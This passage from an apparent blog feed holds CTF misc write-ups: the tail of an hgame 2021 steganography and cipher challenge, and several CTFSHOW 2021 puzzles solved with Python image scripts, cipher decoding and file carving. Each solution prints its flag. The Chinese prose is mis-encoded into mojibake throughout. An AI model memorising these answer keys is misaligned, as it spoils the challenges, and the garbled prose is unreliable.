class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">58</span>; i++)</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â tr[table[i]] = i</span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="keyword">const</span> s = [<span class="number">11</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>]</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="keyword">const</span> xor = <span class="number">177451812</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="keyword">const</span> add = <span class="number">8728348608</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="function"><span class="keyword">function</span> <span class="title">dec</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">let</span> r = <span class="number">0</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â r += tr[x[s[i]]] * 58 ** i</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span> (r - add) ^ xor</span></span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â x = (x ^ xor) + add</span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â r = <span class="string">&#x27;BV1 Â 4 1 7 Â &#x27;</span>.split(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â r[s[i]] = table[<span class="built_in">parseInt</span>(x / <span class="number">58</span> ** i) % <span class="number">58</span>]</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span> r.join(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line">Â Â Â Â <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614930816508/8dbb6f09919d7b898a935f195e07f7eb444516ea.png"></p><p>å¾—åˆ°äº† <code>BV17f411J77h</code>ï¼Œå°†å…¶ä½œä¸ºå¯†ç è§£å‹ BVenc(10001540).7zã€‚æ‰“å¼€è§†é¢‘å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¸¤æ®µå†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614931302198/59bef60e3bd2489c98493476b8510366f87a15c8.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is The answer to live, the universe and everything?</span><br><span class="line"></span><br><span class="line">#)+F7IIMEH:?Injiikffi</span><br><span class="line">pwbvmpoakiscqdobil</span><br></pre></td></tr></table></figure><p>åŒæ—¶ Fragments.txt ä¸­æœ‰å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zB7&#x3D; ?I DEJ &gt;;H;&#96; 8KJ &#125; MH?J; ?J 8;97KI; OEK C7O D;;: CEH; MEH:I JE 7D7BOI?I M&gt;7J ;D9E:?D&#x3D; J&gt;; B?D;e ?Ib</span><br><span class="line">zEH B?D;f&#96; &quot;?A? &gt;7I JEB: OEK M&gt;7J ?J ?I&#96; 7D: uA?H7 ?I D;9;II7HO JE :E ?Jb</span><br><span class="line">*ME OEKD&#x3D; &#x3D;?HBI ;NFBEH; 7 I&gt;7JJ;H;: MEHB:&#96; &lt;?BB;: M?J&gt; IEKD:n 7 F7IJ JE 8; KD9EL;H;:bbb</span><br><span class="line">y79&gt; 7M7A;DI ?D J&gt;?I 8B7DA&#96; HK?Da:EJJ;: MEHB: JE :?I9EL;H J&gt;7J I&gt;; ?I ;GK7BBO 8B7DA&#96; H;C;C8;H?D&#x3D; DEJ&gt;?D&#x3D; E&lt; M&gt;7J 97C; 8;&lt;EH;b</span><br><span class="line">uD: J&gt;;D J&gt;;O C7A; 7 I;9ED: :?I9EL;HOn J&gt;; uH97;7&#96; CKBJ?JK:;I E&lt; &lt;BE7J?D&#x3D; &#x3D;B7IIaB?A; I&gt;7H:I 9EDJ7?D?D&#x3D; L?L?: C;CEH?;I E&lt; J&gt;; F7IJb</span><br></pre></td></tr></table></figure><p>è§†é¢‘ä¸­çš„é—®é¢˜çš„ç­”æ¡ˆå¾ˆæ˜æ˜¾æ˜¯ 42ï¼Œå› æ­¤å°†ä¸Šè¿°å†…å®¹åš <code>ROT 42</code> å˜æ¢å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag is not here, but I write it because you may need more words to analysis what encoding the line1 is.</span><br><span class="line">For line2, Liki has told you what it is, and Akira is necessary to do it.</span><br><span class="line">Two young girls explore a shattered world, filled with sound: a past to be uncovered...</span><br><span class="line">Each awakens in this blank, ruin-dotted world to discover that she is equally blank, remembering nothing of what came before.</span><br><span class="line">And then they make a second discovery: the Arcaea, multitudes of floating glass-like shards containing vivid memories of the past.</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå°†è§†é¢‘ä¸­ç¬¬äºŒæ®µçš„ç¬¬ä¸€è¡Œåš <code>ROT 42</code> å˜æ¢å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSUpasswordis:6557225</span><br></pre></td></tr></table></figure><p>æ ¹æ®æœç´¢å¯ä»¥å‘ç°<a href="http://www.compression.ru/video/stego_video/index_en.html">æ’ä»¶</a>ï¼Œåœ¨ç»™å‡ºçš„è½¯ä»¶ä¸­åŠ è½½æ’ä»¶ï¼Œæ‰“å¼€è§†é¢‘åè®¾ç½®å¦‚ä¸‹å‚æ•°ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614932436434/9e17251eefdf4db39761c4a7e426d03d13497739.png"></p><p>æ­¤æ—¶å†æ¸²æŸ“ä¿å­˜æ–‡ä»¶ä¸º .avi å³å¯å¾—åˆ°æ’ä»¶æå–å‡ºçš„å¦‚ä¸‹éšè—å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arc.hgame2021.cf</span><br><span class="line">Hikari</span><br><span class="line">Tairitsu</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°å†…å®¹ä½œä¸ºç½‘å€å’Œç”¨æˆ·åå¯†ç ç™»å½•åå¯è¿›å…¥ä¸€ä¸ªæ²¡ä»€ä¹ˆä¿¡æ¯çš„ç½‘ç«™ã€‚æ­¤æ—¶å›è¿‡å¤´æ¥å‘ç°æç¤ºä¿¡æ¯ä¸­æ›¾ç»æåˆ°è¿‡ Arcaeaï¼Œå› æ­¤çŒœæµ‹å¯†æ–‡ <code>pwbvmpoakiscqdobil</code> çš„è§£å¯†å†…å®¹è·Ÿè¿™ä¸ªéŸ³æ¸¸ç›¸å…³ã€‚æ ¹æ®æç¤ºåœ¨ week1 Crypto ç¬¬ä¸€é¢˜çš„è§£å¯†è¿‡ç¨‹ä¸­æ‰¾åˆ°äº†å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Vigenere-Liki</span><br><span class="line">Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x</span><br></pre></td></tr></table></figure><p>çŒœæµ‹ä½¿ç”¨çš„åŠ å¯†æ–¹æ³•æ˜¯ VigenÃ¨reï¼Œäºæ˜¯å°è¯•ä½¿ç”¨ akira ä½œä¸º key è§£å¯†ã€‚å¾—åˆ°äº†å¯è¯»çš„å†…å®¹ <code>pmtempestissimobyd</code>ã€‚å°†å…¶æ‹¼æ¥åˆ°ç½‘ç«™è·¯å¾„ä¸­è®¿é—®åå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614933099107/f6fbedecb5bf3678fd864560388c886334140e3c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Y0u_Find_Pur3_Mem0ry&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW å¤§å‰å¤§åˆ©æ¯ 2021</title>
      <link href="/zh-CN/posts/41fb5acf.html"/>
      <url>/zh-CN/posts/41fb5acf.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æ‹¼å›¾v2-0"><a href="#æ‹¼å›¾v2-0" class="headerlink" title="æ‹¼å›¾v2.0"></a>æ‹¼å›¾v2.0</h3><p>æœ´å®æ— åçš„æ‹¼å›¾ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ <code>favicon.png</code> æä¾›äº†åŸå›¾ï¼ŒåŒæ—¶å› ä¸ºå›¾ç‰‡éœ€è¦æ—‹è½¬ï¼Œæ‰€ä»¥ gaps è¡Œä¸é€šäº†ã€‚</p><p>è¿™é‡Œé¦–å…ˆä½¿ç”¨ Chrome æ’ä»¶ Resources Saver ä¸‹è½½æ‰€æœ‰çš„å›¾ç‰‡ï¼Œç„¶åå†™è„šæœ¬æ‹¼å›¾ã€‚å› ä¸ºåŸå›¾å·²ç»ç»™å‡ºï¼Œæ‰€ä»¥å°†åŸå›¾æŒ‰ç…§é¢˜ç›®çš„æ–¹å¼åˆ‡ç‰‡å³å¾—åˆ°äº†æ‹¼å›¾çš„æ¨¡æ¿ã€‚å‰©ä¸‹è¦åšçš„å°±æ˜¯å°†æ‹¼å›¾ä¸åŸå›¾çš„åˆ‡ç‰‡ä¸€ä¸€å¯¹åº”ç„¶åæ‹¼åˆã€‚è¿™é‡Œé‡‡ç”¨äº†é‡‡æ ·çš„åŠæ³•ï¼Œæ¯ä¸ªåˆ‡ç‰‡å–ä¹ä¸ªé‡‡æ ·ç‚¹ï¼Œç„¶åæ ¹æ®å…¶åŒ¹é…çš„é¡ºåºå°†åˆ‡ç‰‡è¿›è¡Œæ—‹è½¬ï¼Œå…¨éƒ¨å®Œæˆä¹‹åæ‹¼åˆå³å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952302386/1dfaa2254361bab1b618da7f3c0b0406c124fd20.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NinePointSamplingAnalyze</span>(<span class="params">image</span>):</span></span><br><span class="line">    width, height = image.size</span><br><span class="line">    imgObject = image.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    pixels = imgObject.load()</span><br><span class="line">    samplings = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            samplePixel = pixels[(width - <span class="number">1</span>) <span class="keyword">if</span> j == <span class="number">2</span> <span class="keyword">else</span> (width // <span class="number">2</span>) * j, (height - <span class="number">1</span>) <span class="keyword">if</span> i == <span class="number">2</span> <span class="keyword">else</span> (height // <span class="number">2</span>) * i]</span><br><span class="line">            samplings.append(samplePixel)</span><br><span class="line">    image.close()</span><br><span class="line">    <span class="keyword">return</span> samplings</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingMatch</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> sample[i] == modelSample[<span class="string">&quot;sample&quot;</span>][i]:</span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestRotate</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flags.append(SamplingMatch(modelSample, sample))</span><br><span class="line">        sample = SamplingRotate(sample)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)) * (-<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingRotate</span>(<span class="params">sample</span>):</span></span><br><span class="line">    newSamplings = []</span><br><span class="line">    index = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        newSamplings.append(sample[index[i]])</span><br><span class="line">    <span class="keyword">return</span> newSamplings</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestSolve</span>(<span class="params">modelSamplings, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    degrees = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelSamplings)):</span><br><span class="line">        flag, degree = SamplingBestRotate(modelSamplings[i], sample)</span><br><span class="line">        flags.append(flag)</span><br><span class="line">        degrees.append(degree)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)), degrees[flags.index(<span class="built_in">max</span>(flags))]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f4864ce0-18d6-4e45-bb51-08a9d47de97f&#125;</span><br></pre></td></tr></table></figure><h3 id="AA86"><a href="#AA86" class="headerlink" title="AA86"></a>AA86</h3><p>æ ¹æ®é¢˜ç›®æè¿° <code>å¤§çº¦åœ¨16ä½æ“ä½œç³»ç»Ÿè¿˜èƒ½è·‘çš„å¹´ä»£</code>ï¼Œæœç´¢å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952493829/5803876425520d5e7f0bb982c747f05dc16e9ac4.png"></p><p>äºæ˜¯æå‡ºå­¦æ±‡ç¼–çš„æ—¶å€™ç”¨çš„ DOSBOX æ‰§è¡Œä¸€æ³¢ï¼Œå¾—åˆ°äº† flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952601784/ce893e0360300e9b38e496410b13fc737758eb0a.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;https:&#x2F;&#x2F;utf-8.jp&#x2F;public&#x2F;sas&#x2F;index.html&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¢‘å¯ºå…­åå››å¦"><a href="#ç¢‘å¯ºå…­åå››å¦" class="headerlink" title="ç¢‘å¯ºå…­åå››å¦"></a>ç¢‘å¯ºå…­åå››å¦</h3><p>å°†å›¾ç‰‡åè‰²åç”¨ stegsolve è§£å‡º LSB éšå†™ï¼Œå¾—åˆ°ä¸€å¼  PNGã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952736592/6c6ba2167f1c48bf3c66756d2fef8db6959dde13.png"></p><p>å°†æ–‡ä»¶å¤´å¤„ç†å¥½åæ‰“å¼€ï¼Œå¾—åˆ°ä¸€å¼ ä¸ç¢‘ä¸Šçš„å¦å¯¹åº”çš„å›¾ã€‚</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13085261981/0" style="zoom:200%;" /><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952884823/8035a6eb7b74b33372f158cf7a070bd924c2b4fc.png" alt="image-20210125233544602"></p><p>ç„¶åå°†å›¾ä¸Šæ¯ä¸€ä¸ªå¯¹åº”å…«å¦å›¾å’Œå…­åå››å¦é€ŸæŸ¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ™‹ å™¬å—‘ äº• å¤ è°¦ ä¸°</span><br><span class="line">æ¸ å¤§è¿‡ ç½ å·½ æ— å¦„ å±¯</span><br><span class="line">ä¸­å­š è§‚ å½’å¦¹ é© å é¢ </span><br><span class="line">é© æ˜å¤· å¦ æ³° æ˜å¤·</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§å›¾ä¸Šçš„æ•°å­—è§£å‡ºå³ä¸º <code>5 37 26 32 8 44 11 30 53 27 39 34 51 3 52 46 18 33 46 40 7 56 40</code>ï¼Œå°†å…¶å¯¹åº” Base64 ç¼–ç è¡¨è§£å‡º <code>FlagIsLe1bnizD0uShuoH4o</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Le1bnizD0uShuoH4o&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‰›å¹´å¤§å‰"><a href="#ç‰›å¹´å¤§å‰" class="headerlink" title="ç‰›å¹´å¤§å‰"></a>ç‰›å¹´å¤§å‰</h3><p>vhd æ–‡ä»¶ï¼ŒæŒ‚è½½å‘ç°æç¤ºæ ¼å¼åŒ–ï¼Œäºæ˜¯æ‰“å¼€ WinHex è¯»å–ã€‚å‘ç°å¼•å¯¼æ‰‡åŒºè¢«æ“¦é™¤äº†ï¼ŒåŒæ—¶æœ‰ <code>ï¼Ÿlag.7z</code> å’Œ <code>ç‰›å¹´å¤§å‰.jpg</code> ä¸¤ä¸ªæ–‡ä»¶ã€‚æ ¹æ®æç¤º<strong>å‹ç¼©åŒ…å¯†ç åœ¨å›¾ç‰‡æ–‡ä»¶å¤´é‡Œ</strong>å¯çŸ¥å¯†ç ä¸º <code>89504E47</code>ï¼Œè§£å‹å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_The_Year_of_the_Ox&#125;</span><br></pre></td></tr></table></figure><h3 id="è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—"><a href="#è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—" class="headerlink" title="è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—"></a>è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å—</h3><p>å°†å›¾ç‰‡å¥—å¨ƒ foremost ä¹‹åå¾—åˆ°å››å¼ äºŒç»´ç ï¼Œæ‰«å‡ºæ¥å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- è¯·é—®DJB CTFæ¯”èµ›çš„ç­¾åˆ°å¤„åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Ÿ</span><br><span class="line">- å¥½åƒæ²¡æœ‰å²”è·¯äº†ï¼Œä¸€ç›´å¾€å‰èµ°è¯•è¯•çœ‹</span><br><span class="line">- å¥½åƒæ²¡æœ‰å²”è·¯äº†ï¼Œä¸€ç›´å¾€å‰èµ°è¯•è¯•çœ‹</span><br><span class="line">- å’¦ï¼Œè¿™æ˜¯æ­»èƒ¡åŒï¼Œæ˜¯ä¸æ˜¯å“ªé‡Œèµ°é”™è·¯äº†</span><br></pre></td></tr></table></figure><p>äºæ˜¯å›åˆ°ç¬¬äºŒå¼ ï¼Œå°è¯•ä½¿ç”¨ StegSolve çœ‹éšå†™ï¼Œå¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952987987/fee470d1bab9c4d741ec29d85e535744abe99c2f.png"></p><p>æ ¹æ®çŒªåœˆå¯†ç è§£å¯†è¡¨ï¼Œè§£å¾—å†…å®¹ä¸º <code>FLAGDAJIADOAIDJB</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953098088/81d335b53e7d297a990c76c516939324fc3e8cb6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dajiadoaidjb&#125;</span><br></pre></td></tr></table></figure><h3 id="åå…«èˆ¬å…µå™¨"><a href="#åå…«èˆ¬å…µå™¨" class="headerlink" title="åå…«èˆ¬å…µå™¨"></a>åå…«èˆ¬å…µå™¨</h3><p>ä½¿ç”¨å‹ç¼©æ–‡æ¡£å¤‡æ³¨<strong>2021ç‰›å¹´å¤§å‰</strong>è§£å‹åå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£å’Œåå…«å¼ å…µå™¨çš„å›¾ã€‚å›¾æ˜¯ jpg çš„ JPHS éšå†™ï¼Œåˆ†åˆ«æå–å‡ºæ¥ä¹‹åå‘ç°æ¯æ®µæ–‡æœ¬åé¢æœ‰å‡ ä¸ªæ•°å­—ï¼Œå°†å…¶æŒ‰ç…§æ–‡æœ¬æ–‡æ¡£ä¸­å…µå™¨çš„é¡ºåº <code>åˆ€ã€æªã€å‰‘ã€æˆŸã€æ–§ã€é’ºã€é’©ã€å‰ã€é­ã€é”ã€é”¤ã€æˆˆã€é•‹ã€æ£ã€æ§Šã€æ£’ã€çŸ›ã€è€™</code> åˆ†ç±»æ‹¼æ¥ï¼Œå¾—åˆ°å¦‚ä¸‹ä¸¤ç«¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">136143999223163525817639797858700963935</span><br><span class="line">3044053720460556276610613346353724230575</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«ä½¿ç”¨åè¿›åˆ¶è½¬åå…­è¿›åˆ¶å’Œå…«è¿›åˆ¶è½¬åå…­è¿›åˆ¶å¤„ç†åæ‹¼æ¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</span><br></pre></td></tr></table></figure><p><code>From Hex</code> è§£å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_10_bA_Ban_b1ng_Q1&#125;</span><br></pre></td></tr></table></figure><h3 id="è‰²å›¾ç”Ÿæˆå™¨"><a href="#è‰²å›¾ç”Ÿæˆå™¨" class="headerlink" title="è‰²å›¾ç”Ÿæˆå™¨"></a>è‰²å›¾ç”Ÿæˆå™¨</h3><p>è§£å‹æ–‡ä»¶åå¯å¾—åˆ°ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå†™æ»¡é¢œè‰²çš„æ–‡æœ¬æ–‡æ¡£ã€‚å°†å›¾ç‰‡å¤„ç†ä¸€ä¸‹ï¼Œåªç•™ä¸‹æœ‰å°é•¿æ–¹å—çš„éƒ¨åˆ†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953294592/24e5192096fb763e44b6aa8ca8eb912b8ff6d3a7.png"></p><p>ç„¶åå°†å…¶ä¸­çš„åƒç´ å€¼è¯»å‡ºæ¥ï¼Œæ¯ä¸ªå°é•¿æ–¹å—è®°å½•ä¸€æ¬¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.png&quot;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">extractedFile = <span class="built_in">open</span>(<span class="string">&quot;extracted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">widthPiece = width // <span class="number">5</span></span><br><span class="line">heightPiece = height // <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(heightPiece):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(widthPiece):</span><br><span class="line">        pixel = image.getpixel((<span class="number">5</span> * y, <span class="number">20</span> * x))</span><br><span class="line">        colorByte = <span class="built_in">str</span>((pixel[<span class="number">0</span>] <span class="keyword">if</span> pixel[<span class="number">0</span>] != <span class="number">0</span> <span class="keyword">else</span> pixel[<span class="number">1</span>] <span class="keyword">if</span> pixel[<span class="number">1</span>] != <span class="number">0</span> <span class="keyword">else</span> pixel[<span class="number">2</span>]))</span><br><span class="line">        extractedFile.write(<span class="string">&quot;&#123;&#125; &quot;</span>.<span class="built_in">format</span>(colorByte))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Written &#123;&#125;&quot;</span>.<span class="built_in">format</span>(colorByte))</span><br><span class="line">extractedFile.close()</span><br></pre></td></tr></table></figure><p>å°†æ‰€å¾—çš„å†…å®¹ç»è¿‡ <code>From Decimal</code> è§£ç ä¹‹åå¯ä»¥å¾—åˆ°ä¸€ä¸ª rar 